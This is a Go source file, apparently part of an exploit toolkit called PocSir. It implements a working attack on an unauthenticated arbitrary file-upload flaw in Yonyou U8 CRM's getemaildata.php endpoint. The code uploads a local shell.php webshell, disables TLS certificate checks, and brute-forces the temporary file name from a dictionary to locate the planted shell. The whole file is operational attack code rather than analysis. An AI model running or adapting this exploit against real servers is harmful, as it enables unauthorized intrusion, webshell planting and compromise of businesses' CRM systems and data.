package poc

import (
	"PocSir/common"
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func U8CRM_upload_exp(target string) {
	filePath := "test.php "

	// 创建一个缓冲区，用于构建请求主体
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	//创建文件表单字段
	file, err := writer.CreateFormFile("file", filePath)
	if err != nil {
		common.ErrMsg.Println(err)
		return
	}

	//打开文件并复制到表单缓冲区
	open, err := os.Open("shell.php")
	if err != nil {
		common.ErrMsg.Println(err)
		return
	}
	defer open.Close()
	_, err = io.Copy(file, open)
	if err != nil {
		common.ErrMsg.Println(err)
		return
	}
	// 添加空文件
	writer.CreateFormFile("file1", "")

	err = writer.Close()
	if err != nil {
		common.ErrMsg.Println(err)
		return
	}

	//创建POST请求
	req, err := http.NewRequest("POST", target+"/ajax/getemaildata.php?DontCheckLogin=1", body)
	if err != nil {
		common.ErrMsg.Println(err)
		return
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
	}
	resp, err := client.Do(req)
	if err != nil {
		common.ErrMsg.Println(err)
	}
	defer resp.Body.Close()

	read, err := io.ReadAll(resp.Body)
	if err != nil {
		common.ErrMsg.Println(err)
	}

	sucpatern := regexp.MustCompile("success")
	success := sucpatern.MatchString(string(read))
	fmt.Println(success)

	if resp.StatusCode == 200 && success {
		common.Right.Printf("[+]存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞\n")
		// 正则表达式模式
		filePathPattern := `"filePath":"(.*?)"`

		// 编译正则表达式
		filePathRegex := regexp.MustCompile(filePathPattern)

		// 查找匹配项
		filePathMatches := filePathRegex.FindStringSubmatch(string(read))

		// 提取匹配结果
		if len(filePathMatches) > 1 {
			filePath := filePathMatches[1]
			//fmt.Println("File Path:", filePath)
			parts := strings.Split(filePath, "\\")
			mht := parts[len(parts)-1]
			pot := strings.Split(mht, ".")
			name := pot[0] //mht9D54
			one2 := name[3:5]
			//fmt.Println(one2)
			target = target + "/tmpfile/" + "upd" + one2
			file, err := os.Open("hex_dictionary.txt")
			if err != nil {
				common.ErrMsg.Println("Open dict ErrMsg!")
			}
			defer file.Close()

			client := &http.Client{}
			scanner := bufio.NewScanner(file)
			for scanner.Scan() {
				lastName := scanner.Text()
				fileUrl := target + lastName + ".tmp.php"
				resp, err := client.Head(fileUrl)
				if err != nil {
					common.ErrMsg.Printf("[-] Error:%v", err)
					continue
				}
				defer resp.Body.Close()

				// 根据响应码判断是否存在
				if resp.StatusCode == http.StatusOK {
					common.Right.Printf("[+]Shell地址: %s\n" + fileUrl)
					break
				} else {
					continue
				}
			}
		} else {
			common.ErrMsg.Println("File Path not found")
		}
	} else {
		common.ErrMsg.Println("[-]不存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞")
	}
}
